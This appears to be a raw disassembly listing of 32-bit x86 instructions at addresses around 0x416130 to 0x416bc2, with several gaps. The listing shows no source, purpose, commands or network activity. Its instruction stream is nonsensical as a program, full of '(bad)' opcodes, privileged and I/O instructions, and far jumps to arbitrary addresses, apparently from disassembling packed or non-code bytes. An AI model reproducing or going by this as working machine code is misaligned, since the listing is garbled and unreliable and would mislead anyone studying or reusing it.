  41612f:	and    BYTE PTR [edx-0x33456bd3],dh
  416135:	ja     0x41619b
  416137:	inc    edx
  416138:	test   BYTE PTR [ecx],0xad
  41613b:	jecxz  0x4160f6
  41613d:	aas    
  41613e:	lods   al,BYTE PTR ds:[esi]
  41613f:	lock push ss
  416141:	scas   al,BYTE PTR es:[edi]
  416142:	xchg   BYTE PTR ds:0x673b733d,bh
  416148:	adc    BYTE PTR [edi-0x1d],bl
  41614b:	xor    BYTE PTR [edx-0x30],ch
  41614e:	daa    
  41614f:	jmp    0x895e:0x568eacf4
  416156:	mov    bl,0x6c
  416158:	mov    DWORD PTR [ebx+0x50],edi
  41615b:	fcmovbe st,st(6)
  41615d:	sub    esi,esi
  41615f:	fimul  DWORD PTR [edx-0x527dc20d]
  416165:	cli    
  416166:	les    edi,FWORD PTR [ebx+0x47248c0d]
  41616c:	xchg   ebx,eax
  41616d:	cwde   
  41616e:	add    bh,al
  416170:	gs stos BYTE PTR es:[edi],al
  416172:	scas   eax,DWORD PTR es:[edi]
  416173:	sbb    ecx,DWORD PTR [edi]
  416175:	push   esp
  416176:	stc    
  416177:	push   DWORD PTR [esi+0x26514021]
  41617d:	xchg   ebp,eax
  41617e:	sbb    eax,0x4a32128a
  416183:	add    BYTE PTR [ecx],dl
  416185:	aas    
  416186:	(bad)  
  416188:	xor    edx,edx
  41618a:	lods   al,BYTE PTR ds:[esi]
  41618b:	lods   eax,DWORD PTR ds:[esi]
  41618c:	mov    eax,ds:0x215796f0
  416191:	lock icebp 
  416193:	or     eax,0x240dbc64
  416198:	fbstp  TBYTE PTR [eax-0x59]
  41619b:	mov    ebx,0xaf945365
  4161a0:	sbb    al,0x9c
  4161a2:	lds    esp,FWORD PTR [ebx]
  4161a4:	jno    0x4161ef
  4161a6:	sub    DWORD PTR [edx-0x38],0x4cf21e13
  4161ad:	iret   
  4161ae:	popf   
  4161af:	adc    bh,BYTE PTR [edx-0x50c7c4fd]
  4161b5:	stos   DWORD PTR es:[edi],eax
  4161b6:	stos   BYTE PTR es:[edi],al
  4161b7:	mov    cl,0x7e
  4161b9:	pop    ebx
  4161ba:	test   al,0xa7
  4161bc:	add    eax,0xa9a4a9a1
  4161c1:	sub    BYTE PTR [edx+0x4f133104],0xc1
  4161c8:	daa    
  4161c9:	add    dh,BYTE PTR [ecx+0x7132ec77]
  4161cf:	call   0xaab4:0x57f42779
  4161d6:	les    esi,FWORD PTR [ebp-0x651bd0a6]
  4161dc:	aaa    
  4161dd:	cmc    
  4161de:	lahf   
  4161df:	cmc    
  4161e0:	js     0x4161ab
  4161e2:	mov    DWORD PTR [edi],edi
  4161e4:	sub    BYTE PTR [ecx+0x5b0cae3e],0x36
  4161eb:	retf   0x32d7
  4161ee:	ret    0x9cde
  4161f1:	(bad)  
  4161f2:	call   0x4eb3:0xcf9f7f66
  4161f9:	shl    dh,cl
  4161fb:	adc    DWORD PTR [ebx],esp
  4161fd:	fwait
  4161fe:	jnp    0x416255
  416200:	loope  0x4161e3
  416202:	adc    bh,BYTE PTR [edi+0x1e]
  416205:	std    
  416206:	cdq    
  416207:	mov    BYTE PTR [eax+ebx*4],al
  41620a:	out    dx,al
  41620b:	inc    ecx
  41620c:	mov    dh,0x54
  41620e:	adc    al,0xb9
  416210:	call   0x2fc5:0xebb1312a
  416217:	hlt    
  416218:	(bad)  
  41621a:	adc    edi,esi
  41621c:	sub    dl,BYTE PTR [eax]
  41621e:	xor    ch,al
  416220:	add    eax,0xc225a57c
  416225:	lods   eax,DWORD PTR ds:[esi]
  416226:	mov    esp,0x32eda388
  41622b:	scas   al,BYTE PTR es:[edi]
  41622c:	sub    al,0x6a
  41622e:	push   edi
  41622f:	call   0xefbb7838
  416234:	call   0x416239
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x1786f6de],bh
  4162a4:	xchg   esp,eax
  4162a5:	mov    ch,0x95
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [esi-0x58f42320],ah
  4162b3:	push   ebp
  4162b4:	dec    esi
  4162b5:	stos   BYTE PTR es:[edi],al
  4162b6:	adc    eax,0x9b820869
  4162bb:	inc    BYTE PTR [esi-0x3d]
  4162be:	sub    bl,bl
  4162c0:	js     0x41626e
  4162c2:	sub    BYTE PTR [edi+ebp*4+0x13],ch
  4162c6:	sbb    edx,ecx
  4162c8:	mov    esp,0xe95b7a91
  4162cd:	stos   BYTE PTR es:[edi],al
  4162ce:	rcl    BYTE PTR [esi+0x78],1
  4162d1:	(bad)  
  4162d2:	jmp    0xaade:0xfe2a4338
  4162d9:	ror    BYTE PTR [edi+0x5265ba0d],cl
  4162df:	push   ds
  4162e0:	shr    DWORD PTR [ebx],cl
  4162e2:	mov    ds:0xf4e89a5d,eax
  4162e7:	mov    ds:0xfac11cd9,al
  4162ec:	sti    
  4162ed:	push   esp
  4162ee:	xor    eax,0x205e5908
  4162f3:	dec    edx
  4162f4:	sbb    al,0x20
  4162f6:	or     eax,0xd458e65d
  4162fb:	push   eax
  4162fc:	push   ebp
  4162fd:	inc    eax
  4162fe:	pop    ss
  4162ff:	lods   al,BYTE PTR ds:[esi]
  416300:	addr16 das 
  416302:	sub    al,0x7
  416304:	jp     0x416370
  416306:	mov    esp,0x5359e8da
  41630b:	cs push es
  41630d:	dec    edx
  41630e:	cmp    DWORD PTR [ebp+0x4],esi
  416311:	rol    DWORD PTR [ebx-0x2a],0x66
  416315:	pusha  
  416316:	cmp    ebx,eax
  416318:	sbb    BYTE PTR [ecx*2+0x53fd3de3],dh
  41631f:	push   eax
  416320:	jne    0x4162f5
  416322:	mov    ?,WORD PTR [ecx]
  416324:	div    DWORD PTR [ebx]
  416326:	and    ch,BYTE PTR [edx+0x54]
  416329:	dec    eax
  41632a:	push   cs
  41632b:	ins    BYTE PTR es:[edi],dx
  41632c:	mov    eax,0x91c03cfa
  416331:	das    
  416332:	sub    eax,0xaeddbfa8
  416337:	pop    ds
  416338:	cmp    ecx,ecx
  41633a:	push   0x11
  41633c:	nop
  41633d:	std    
  41633e:	xor    eax,0x888d8633
  416343:	jecxz  0x416337
  416345:	sbb    BYTE PTR [ebp-0x284f56c3],bl
  41634b:	call   0xd590:0xb762bc27
  416352:	test   BYTE PTR [esp+eax*4-0x26],bl
  416356:	and    BYTE PTR ds:0x22a483bd,dh
  41635c:	xlat   BYTE PTR ds:[ebx]
  41635d:	mov    cl,0xca
  41635f:	inc    edx
  416360:	sti    
  416361:	ja     0x416316
  416363:	nop
  416364:	cmp    ch,dh
  416366:	add    bh,BYTE PTR [esi+0x15880f7b]
  41636c:	(bad)  
  41636d:	sub    BYTE PTR [ecx-0x30],bh
  416370:	push   0x190f8b8d
  416375:	pop    edi
  416376:	outs   dx,BYTE PTR ds:[esi]
  416377:	jmp    0x4163ab
  416379:	jnp    0x416368
  41637b:	arpl   WORD PTR [edi-0x5c],ax
  41637e:	test   DWORD PTR ds:0x40e1da9f,ebp
  416384:	out    dx,al
  416385:	mov    al,0xe2
  416387:	psubsw mm7,mm6
  41638a:	cdq    
  41638b:	icebp  
  41638c:	jle    0x416365
  41638e:	inc    esp
  41638f:	xor    DWORD PTR [ebx+0x1b],ebx
  416392:	push   esp
  416393:	mov    ebp,0xe1812410
  416398:	(bad)  
  416399:	mov    ah,0xc5
  41639b:	sub    eax,0x37302e30
  4163a0:	retf   0x8740
  4163a3:	shl    DWORD PTR [edx+eax*2+0x63dcb69c],0xe7
  4163ab:	pop    es
  4163ac:	into   
  4163ad:	mov    WORD PTR [edx-0x79],gs
  4163b0:	js     0x4163b4
  4163b2:	cmp    eax,0xe0de
	...
  416413:	add    BYTE PTR [eax],al
  416415:	add    bl,dh
  416417:	inc    ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp+0x7053fe2d],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	dec    ecx
  41642f:	lahf   
  416430:	cdq    
  416431:	mov    ds:0xb24f9ef3,al
  416436:	int    0x35
  416438:	mov    eax,0x7e46dd3c
  41643d:	scas   al,BYTE PTR es:[edi]
  41643e:	xor    ah,BYTE PTR [edx-0x35b52b35]
  416444:	scas   al,BYTE PTR es:[edi]
  416445:	xchg   edx,eax
  416446:	jle    0x416455
  416448:	outs   dx,DWORD PTR ds:[esi]
  416449:	mov    ecx,0x24a1bb34
  41644e:	inc    edi
  41644f:	inc    ebp
  416450:	pop    esi
  416451:	in     al,dx
  416452:	retf   
  416453:	bound  ebx,QWORD PTR [esi+0x7b]
  416456:	jbe    0x41644c
  416458:	mov    bh,0xd4
  41645a:	bound  edi,QWORD PTR [esi-0x6e1d8c6d]
  416460:	(bad)  
  416461:	(bad)  
  416463:	popf   
  416464:	adc    bh,BYTE PTR [eax+0x62]
  416467:	sbb    DWORD PTR [edx+0x13b1424a],ecx
  41646d:	adc    eax,DWORD PTR [esp+ebx*2]
  416470:	dec    edi
  416471:	out    dx,eax
  416472:	pop    edi
  416473:	data16 jl 0x416495
  416476:	push   ds
  416477:	pop    DWORD PTR gs:[bx]
  41647b:	mov    dh,ch
  41647d:	enter  0x3978,0x5b
  416481:	lahf   
  416482:	adc    BYTE PTR [eax],bl
  416484:	mov    ah,0xf8
  416486:	or     bh,BYTE PTR [edx-0x7da80bcc]
  41648c:	das    
  41648d:	dec    eax
  41648e:	jle    0x41642e
  416490:	das    
  416491:	out    0x5,al
  416493:	mov    eax,ds:0x432bc8e2
  416498:	xchg   edx,eax
  416499:	mov    ebp,0xc6002a15
  41649e:	ja     0x416437
  4164a0:	push   cs
  4164a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a2:	call   0x1a2b0207
  4164a7:	dec    ebp
  4164a8:	dec    ecx
  4164a9:	mov    ds:0x59b7cc6e,eax
  4164ae:	sti    
  4164af:	xor    al,0xc6
  4164b1:	or     ebp,DWORD PTR [edi]
  4164b3:	push   edx
  4164b4:	les    edi,FWORD PTR [ecx+0x76]
  4164b7:	mov    al,0xab
  4164b9:	jae    0x4164c0
  4164bb:	mov    ds:0x999aa310,eax
  4164c0:	jl     0x416469
  4164c2:	mov    al,0x8c
  4164c4:	enter  0x8345,0x61
  4164c8:	ds push cs
  4164ca:	mov    dh,al
  4164cc:	loope  0x416472
  4164ce:	and    dh,BYTE PTR [ebx-0x22]
  4164d1:	adc    ch,bh
  4164d3:	jecxz  0x4164dc
  4164d5:	mov    ds:0xf3989234,eax
  4164da:	adc    BYTE PTR [esi+0x34b184b4],al
  4164e0:	fst    QWORD PTR ss:[edx+0x21ceda5]
  4164e7:	jno    0x4164d5
  4164e9:	xchg   esi,eax
  4164ea:	fild   DWORD PTR [ebx+0x479710ae]
  4164f0:	jmp    0x416489
  4164f2:	jne    0x416512
  4164f4:	inc    esi
  4164f5:	js     0x41647f
  4164f7:	xchg   ebx,eax
  4164f8:	loope  0x41647b
  4164fa:	out    dx,eax
  4164fb:	sub    BYTE PTR ds:0xa43306a9,0x6a
  416502:	out    0x4b,eax
  416504:	jmp    DWORD PTR [eax]
  416506:	shr    dh,0x59
  416509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41650a:	pop    ds
  41650b:	jnp    0x416495
  41650d:	push   ss
  41650e:	jno    0x416508
  416510:	fwait
  416511:	and    ch,BYTE PTR [edi+0x425dda83]
  416517:	test   DWORD PTR [eax-0x64cb80e],0xbe07773d
  416521:	aam    0x96
  416523:	jmp    0x41655a
  416525:	es mov bl,0xb0
  416528:	inc    eax
  416529:	push   ebp
  41652a:	cmp    BYTE PTR [edx-0x555da7ad],ch
  416530:	stc    
  416531:	btc    ebp,0xcb
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165f2
  4165a3:	aad    0xf2
  4165a5:	push   ds
  4165a6:	mov    ds:0x70000e9,eax
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    dl,al
  4165af:	in     eax,0x6f
  4165b1:	(bad)  
  4165b2:	rcl    WORD PTR [eax],1
  4165b5:	fcomp  DWORD PTR [ebx-0x4c150cad]
  4165bb:	fst    st(7)
  4165bd:	xor    ecx,DWORD PTR [edx]
  4165bf:	call   0x5697:0x8ec571da
  4165c6:	add    al,0xfc
  4165c8:	out    dx,eax
  4165c9:	pop    ebx
  4165ca:	jns    0x416565
  4165cc:	icebp  
  4165cd:	mov    eax,ds:0xfee296e4
  4165d2:	jo     0x4165d5
  4165d4:	out    0xae,al
  4165d6:	cmp    al,0x3c
  4165d8:	dec    esi
  4165d9:	add    eax,0xaa1eee65
  4165de:	fsub   QWORD PTR [ecx+0x58bafe25]
  4165e4:	std    
  4165e5:	cwde   
  4165e6:	adc    ecx,DWORD PTR [ebp+0x15]
  4165e9:	test   BYTE PTR [esi-0x6],0x43
  4165ed:	outs   dx,DWORD PTR ds:[esi]
  4165ee:	mov    ecx,0xe7b3bfa7
  4165f3:	inc    ebx
  4165f4:	push   edi
  4165f5:	mov    cl,0xb9
  4165f7:	mov    ch,dh
  4165f9:	pop    ecx
  4165fa:	pop    ebp
  4165fb:	sub    eax,0x567663e0
  416600:	jb     0x416650
  416602:	les    esp,FWORD PTR [edi-0x1c]
  416605:	sbb    ah,dl
  416607:	push   0xa4567947
  41660c:	fucomp st(3)
  41660e:	test   DWORD PTR [eax-0x1c3defcb],0x1a5f1fd7
  416618:	out    dx,al
  416619:	dec    ebp
  41661a:	dec    esp
  41661b:	fimul  DWORD PTR [ebp-0x17a731d1]
  416621:	repz mov cl,0xd1
  416624:	call   0x5fed5ee5
  416629:	jg     0x4165f3
  41662b:	sbb    dl,BYTE PTR [edi-0x49]
  41662e:	pop    ebx
  41662f:	add    bl,bh
  416631:	jb     0x41665a
  416633:	addr16 clc 
  416635:	sub    BYTE PTR [ebp+0x4608d75c],bh
  41663b:	int3   
  41663c:	sub    DWORD PTR [ebp+eax*2+0x25],0x7a8b15f4
  416644:	jbe    0x4165e2
  416646:	lods   eax,DWORD PTR ds:[esi]
  416647:	xor    al,0x82
  416649:	pop    edi
  41664a:	mov    ebp,0x3051979
  41664f:	pop    ebp
  416650:	scas   al,BYTE PTR es:[edi]
  416651:	arpl   WORD PTR [ecx+edx*8+0x68acb2d1],sp
  416658:	dec    esp
  416659:	js     0x4166cc
  41665b:	sahf   
  41665c:	je     0x416645
  41665e:	pop    edx
  41665f:	adc    eax,ecx
  416661:	popa   
  416662:	jns    0x4165e4
  416664:	add    eax,0x8332bd97
  416669:	lahf   
  41666a:	add    DWORD PTR [ebx],eax
  41666c:	adc    BYTE PTR [ebx],ch
  41666e:	xchg   ebx,eax
  41666f:	and    BYTE PTR [ebx+0x3f],cl
  416672:	mov    eax,ds:0xbf9dedea
  416677:	or     BYTE PTR [edx-0x3acbe632],0x64
  41667e:	retf   0xe46f
  416681:	cmc    
  416682:	xchg   ecx,eax
  416683:	mov    eax,ds:0x9757d4a8
  416688:	cwde   
  416689:	and    ebx,DWORD PTR [ebx]
  41668b:	mov    al,ds:0x4f42a6eb
  416690:	(bad)  
  416691:	sbb    al,bh
  416693:	cmp    DWORD PTR [edx+0x4c],edx
  416696:	and    al,0xc9
  416698:	add    al,0x84
  41669a:	inc    edx
  41669b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41669c:	mov    bh,0x1f
  41669e:	push   ss
  41669f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166a0:	ror    DWORD PTR [ebx-0x1894ba41],cl
  4166a6:	repnz bound eax,QWORD PTR [ecx]
  4166a9:	and    bl,BYTE PTR ds:0x88405f19
  4166af:	lods   al,BYTE PTR ds:[esi]
  4166b0:	stos   BYTE PTR es:[edi],al
  4166b1:	imul   DWORD PTR [ecx]
  4166b3:	mov    esp,0xc
	...
  416714:	add    BYTE PTR [eax],al
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416723:	aad    0x84
  416725:	cwde   
  416726:	stos   BYTE PTR es:[edi],al
  416727:	jmp    0x0:0x1070000
  41672e:	jmp    0x22f4:0x71bd50b9
  416735:	push   ss
  416736:	mov    BYTE PTR [ebx+eiz*4],dh
  416739:	add    edx,edi
  41673b:	sahf   
  41673c:	jns    0x41677e
  41673e:	xor    ebx,DWORD PTR [edi+0x28b08b70]
  416744:	push   edx
  416745:	inc    esp
  416746:	cli    
  416747:	je     0x4166f7
  416749:	loopne 0x4166de
  41674b:	out    dx,eax
  41674c:	clc    
  41674d:	sar    DWORD PTR [ebx],0x39
  416750:	int    0xb7
  416752:	retf   
  416753:	sub    BYTE PTR [ecx],al
  416755:	cdq    
  416756:	les    esi,FWORD PTR [esi]
  416758:	pop    esp
  416759:	cmp    eax,DWORD PTR [ebx+0xf]
  41675c:	test   eax,0xc868898c
  416761:	mov    dh,0x27
  416763:	pop    ebx
  416764:	mov    dl,0x54
  416766:	fs in  eax,dx
  416768:	cmp    BYTE PTR [ebx+0x7721f8b5],cl
  41676e:	jae    0x416701
  416770:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416772:	daa    
  416773:	mov    ?,WORD PTR [ecx*8+0xdff6906]
  41677a:	jge    0x4167d6
  41677c:	jb     0x4167f6
  41677e:	loop   0x416788
  416780:	dec    ebp
  416781:	addr16 adc eax,0x4cdd914c
  416787:	push   ebx
  416789:	pop    esi
  41678a:	fwait
  41678b:	into   
  41678c:	pop    esp
  41678d:	sahf   
  41678e:	pop    ss
  41678f:	aaa    
  416790:	dec    esi
  416791:	sbb    al,0xb2
  416793:	ds mov esi,0x6301cb1
  416799:	(bad)  
  41679a:	iret   
  41679b:	scas   eax,DWORD PTR es:[edi]
  41679c:	rol    DWORD PTR [edx+0x75c3038f],1
  4167a2:	jmp    0xf9d76f65
  4167a7:	xchg   BYTE PTR [edx],dl
  4167a9:	call   0x2a4150da
  4167ae:	and    al,0xd5
  4167b0:	ffreep st(7)
  4167b2:	xor    BYTE PTR [edi-0x69],dl
  4167b5:	int    0x5f
  4167b7:	(bad)  
  4167b8:	and    BYTE PTR [esi-0xa8626f9],cl
  4167be:	xchg   esi,eax
  4167bf:	out    dx,al
  4167c0:	and    DWORD PTR [eax+ebp*2+0x79d8f223],esi
  4167c7:	dec    edx
  4167c8:	popf   
  4167c9:	outs   dx,DWORD PTR ds:[esi]
  4167ca:	add    al,0x3e
  4167cc:	jl     0x4167ae
  4167ce:	jge    0x416778
  4167d0:	push   cs
  4167d1:	add    esi,DWORD PTR [eax]
  4167d3:	arpl   WORD PTR [edx+0x5f],dx
  4167d6:	das    
  4167d7:	push   0x4
  4167d9:	out    dx,al
  4167da:	les    eax,FWORD PTR [ecx]
  4167dc:	push   eax
  4167dd:	and    al,0xd1
  4167df:	shl    DWORD PTR [edx-0x4ba386b1],1
  4167e5:	(bad)  
  4167e7:	push   edx
  4167e8:	inc    edi
  4167e9:	xchg   ebx,eax
  4167ea:	fidiv  DWORD PTR [ecx+0x5a405c0e]
  4167f0:	or     ah,BYTE PTR [edx+0x46fea30c]
  4167f6:	dec    esi
  4167f7:	cmc    
  4167f8:	jnp    0x4167ad
  4167fa:	push   esp
  4167fb:	inc    ebx
  4167fc:	mov    ah,ch
  4167fe:	pushf  
  4167ff:	and    eax,DWORD PTR [edx-0xa]
  416802:	lds    eax,FWORD PTR [edx+0x26]
  416805:	ficom  DWORD PTR [ecx]
  416807:	xchg   esi,eax
  416808:	scas   eax,DWORD PTR es:[edi]
  416809:	leave  
  41680a:	mov    edi,0x1657f621
  41680f:	sub    ah,BYTE PTR [ebx+ebp*4-0x1af64826]
  416816:	iret   
  416817:	mov    DWORD PTR [ebp+ebp*8+0x9d284f0],eax
  41681e:	cmp    eax,0xb100200f
  416823:	outs   dx,BYTE PTR ds:[esi]
  416824:	test   ebp,esi
  416826:	ins    DWORD PTR es:[edi],dx
  416827:	pop    ecx
  416828:	adc    al,0xdd
  41682a:	push   ds
  41682b:	adc    edx,ecx
  41682d:	or     bl,BYTE PTR [edi+0x3]
  416830:	or     al,BYTE PTR [edx-0x77]
  416833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416834:	sbb    al,BYTE PTR [eax]
	...
  416896:	shr    DWORD PTR [edi-0x4810cfa],1
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz fwait
  4168a3:	add    eax,0xebb10726
  4168a8:	add    BYTE PTR [eax],al
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    ah,ch
  4168af:	popa   
  4168b0:	arpl   WORD PTR [esi+eiz*1+0x5c46f5a4],sp
  4168b7:	(bad)  
  4168b8:	adc    edx,DWORD PTR [eax]
  4168ba:	leave  
  4168bb:	shr    BYTE PTR [edi],cl
  4168bd:	add    BYTE PTR [eax+eax*8+0x2c83a627],ch
  4168c4:	sub    esi,esp
  4168c6:	sbb    eax,0xb5b3784a
  4168cb:	pop    ecx
  4168cc:	mov    bl,0xfd
  4168ce:	int    0x3a
  4168d0:	inc    edi
  4168d1:	pop    edx
  4168d2:	sbb    BYTE PTR [eax],bl
  4168d4:	sub    ah,BYTE PTR [ecx+0x7e4afa56]
  4168da:	jno    0x416862
  4168dc:	dec    ebx
  4168dd:	adc    dh,dh
  4168df:	cmp    edi,DWORD PTR [edx+0x13]
  4168e2:	add    eax,0xf54d36db
  4168e7:	mov    ch,0x59
  4168e9:	inc    ecx
  4168ea:	cmc    
  4168eb:	aad    0xf5
  4168ed:	rol    BYTE PTR fs:[edx+0x38],1
  4168f1:	out    0xbe,eax
  4168f3:	sub    cl,dh
  4168f5:	ds je  0x416882
  4168f8:	adc    DWORD PTR [ebx-0x7be099b1],edi
  4168fe:	xor    BYTE PTR [esi+0xe],al
  416901:	mov    edx,0x1b541d82
  416906:	add    DWORD PTR [edx+0x1e],edi
  416909:	mov    bl,0x30
  41690b:	mov    cl,0xff
  41690d:	lds    esi,FWORD PTR [esi+0x2f]
  416910:	xor    bl,dl
  416912:	stos   DWORD PTR es:[edi],eax
  416913:	es mov esp,0x8fc3b1f0
  416919:	pusha  
  41691a:	mov    WORD PTR [eax+0x6c4ebec8],ss
  416920:	cs fndisi(8087 only) 
  416923:	xchg   ecx,eax
  416924:	gs dec ecx
  416926:	popf   
  416927:	setnp  BYTE PTR [ebx-0x3e]
  41692b:	add    DWORD PTR [edi+0x62d9b717],eax
  416931:	ficom  DWORD PTR [edx-0x8]
  416934:	cmc    
  416935:	pop    edx
  416936:	xor    DWORD PTR [ebp+eax*2+0x70ed34a1],esp
  41693d:	dec    BYTE PTR [eax]
  41693f:	(bad)  
  416940:	sub    al,dh
  416942:	or     esi,ebx
  416944:	das    
  416945:	mov    ebx,0x232de82f
  41694a:	sub    dl,BYTE PTR [ebp+ebp*1+0x263c0b71]
  416951:	mov    ?,WORD PTR [edx]
  416953:	test   ebx,ebx
  416955:	sbb    cl,dl
  416957:	into   
  416958:	dec    ecx
  416959:	xor    bh,ch
  41695b:	mov    BYTE PTR [ebp+0x74863e49],bh
  416961:	sub    ebx,DWORD PTR [esp+eax*4+0x38e5d6d0]
  416968:	add    DWORD PTR [edi-0x1f29e940],edx
  41696e:	sqrtps xmm4,XMMWORD PTR [edx+ebp*8+0x11]
  416973:	and    al,0xeb
  416975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416976:	mov    ebx,DWORD PTR [ebx]
  416978:	shl    bl,cl
  41697a:	in     al,0xe3
  41697c:	mov    WORD PTR [edx],ds
  41697e:	mov    eax,ds:0x9df15070
  416983:	sbb    al,0xe4
  416985:	shr    DWORD PTR [ecx-0x67de27ef],0x0
  41698c:	int3   
  41698d:	xchg   esi,eax
  41698e:	push   edx
  41698f:	inc    edi
  416990:	cmp    DWORD PTR [ecx+0x4],edi
  416993:	cli    
  416994:	mov    ebp,0x1a86d846
  416999:	test   eax,0x8cd05b11
  41699e:	inc    eax
  41699f:	cdq    
  4169a0:	push   esp
  4169a1:	xchg   ecx,eax
  4169a2:	jbe    0x41697f
  4169a4:	mov    al,0x9a
  4169a6:	xchg   edi,eax
  4169a7:	xchg   ebp,eax
  4169a8:	loope  0x416951
  4169aa:	enter  0x2528,0x8a
  4169ae:	(bad)  
  4169af:	lock add edi,esi
  4169b2:	dec    eax
  4169b3:	sub    BYTE PTR [ebp+0x0],bl
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	or     cl,ch
  416a24:	fldln2 
  416a26:	mov    eax,0x70000ec
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [ecx-0x5718807f],ch
  416a33:	ficom  WORD PTR [esi-0x586f5903]
  416a39:	lea    esi,[ecx+eax*8-0xa3b3f1e]
  416a40:	dec    esp
  416a41:	fisttp QWORD PTR [esp+ecx*4+0x684704e1]
  416a48:	cmc    
  416a49:	ss pop ss
  416a4b:	pop    ebx
  416a4c:	xor    ecx,eax
  416a4e:	rol    BYTE PTR [edi],cl
  416a50:	mov    ecx,eax
  416a52:	imul   esi,DWORD PTR [esi+ecx*8+0x1b0dd49],0x94a81a72
  416a5d:	imul   esi,DWORD PTR [ecx+eiz*4-0x6a8a1692],0xffffffa7
  416a65:	sub    DWORD PTR [eax-0x5b],ebp
  416a68:	lock mov bh,0xce
  416a6b:	jne    0x416a83
  416a6d:	xlat   BYTE PTR ds:[ebx]
  416a6e:	push   esi
  416a6f:	and    DWORD PTR [eax-0x13],edi
  416a72:	fnstenv [edi-0x26]
  416a75:	popf   
  416a76:	into   
  416a77:	cwde   
  416a78:	xor    al,0x4c
  416a7a:	int3   
  416a7b:	pop    edi
  416a7c:	idiv   DWORD PTR [ebp-0x27fc3df5]
  416a82:	push   esp
  416a83:	imul   ebp,DWORD PTR [edi],0xffffffb9
  416a86:	pop    DWORD PTR [esi+0x1b]
  416a89:	scas   eax,DWORD PTR es:[edi]
  416a8a:	arpl   WORD PTR [ebp+0x7ae512d0],dx
  416a90:	ret    
  416a91:	xchg   edi,eax
  416a92:	xchg   ebx,eax
  416a93:	call   0x9f15d0f1
  416a98:	out    0xd8,al
  416a9a:	(bad)  
  416a9b:	outs   dx,BYTE PTR ds:[esi]
  416a9c:	sub    BYTE PTR [ecx],0xf6
  416a9f:	daa    
  416aa0:	sbb    ecx,ebp
  416aa2:	jmp    0x9e54:0x2742820
  416aa9:	call   0x5b5c:0x633fa3e7
  416ab0:	popf   
  416ab1:	sbb    ah,BYTE PTR [ecx+0x1658331e]
  416ab7:	fcmove st,st(6)
  416ab9:	(bad)  
  416abb:	jne    0x416a5a
  416abd:	scas   eax,DWORD PTR es:[edi]
  416abe:	sub    DWORD PTR [ebx-0x21],esi
  416ac1:	ret    0xeea0
  416ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac5:	xor    DWORD PTR [edx+0x1af4be94],esp
  416acb:	int3   
  416acc:	add    BYTE PTR [ebp-0x20],0x19
  416ad0:	sub    eax,0x157fa66c
  416ad5:	pop    esi
  416ad6:	je     0x416b3d
  416ad8:	aaa    
  416ad9:	mov    edx,0x498da3a8
  416ade:	pop    es
  416adf:	lods   al,BYTE PTR ds:[esi]
  416ae0:	pop    ds
  416ae1:	fbld   TBYTE PTR ss:[ecx-0x18]
  416ae5:	pop    ecx
  416ae6:	out    dx,eax
  416ae7:	fmul   QWORD PTR [esi-0x54]
  416aea:	sbb    eax,0xd518c9a
  416aef:	addr16 sbb al,0xe0
  416af2:	(bad)  
  416af3:	leave  
  416af4:	adc    eax,0x1ceb29cd
  416af9:	pusha  
  416afa:	add    eax,0xfe199724
  416aff:	jmp    0x416b5b
  416b01:	dec    ecx
  416b02:	(bad)  
  416b03:	frstor [ebp+0x2e]
  416b06:	push   edi
  416b07:	stc    
  416b08:	mov    WORD PTR [esi+0x2d4c9ff8],ds
  416b0e:	xor    dl,BYTE PTR [edi]
  416b10:	cmp    eax,0x7fd59f83
  416b15:	pushf  
  416b16:	enter  0x7797,0x7a
  416b1a:	ins    DWORD PTR es:[edi],dx
  416b1b:	icebp  
  416b1c:	int    0xa1
  416b1e:	sub    eax,0xfc95fc24
  416b23:	shl    BYTE PTR [eax-0x11],cl
  416b26:	jmp    0x3cf293a4
  416b2b:	(bad)  
  416b2c:	hlt    
  416b2d:	cvtpi2ps xmm5,QWORD PTR [eax-0x56]
  416b31:	mov    eax,0x4b1a67
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x4da56b6b
  416ba3:	inc    ebx
  416ba4:	sbb    DWORD PTR [edi],ebp
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [esi],bh
  416baf:	pushf  
  416bb0:	into   
  416bb1:	sahf   
  416bb2:	call   0x7269af0e
  416bb7:	fstp   QWORD PTR [ecx+0x41]
  416bba:	or     al,0x64
  416bbc:	(bad)  
  416bbd:	fdiv   QWORD PTR [edx]
  416bbf:	mov    dh,dh
  416bc1:	outs   dx,DWORD PTR ds:[esi]
  416bc2:	cwde   
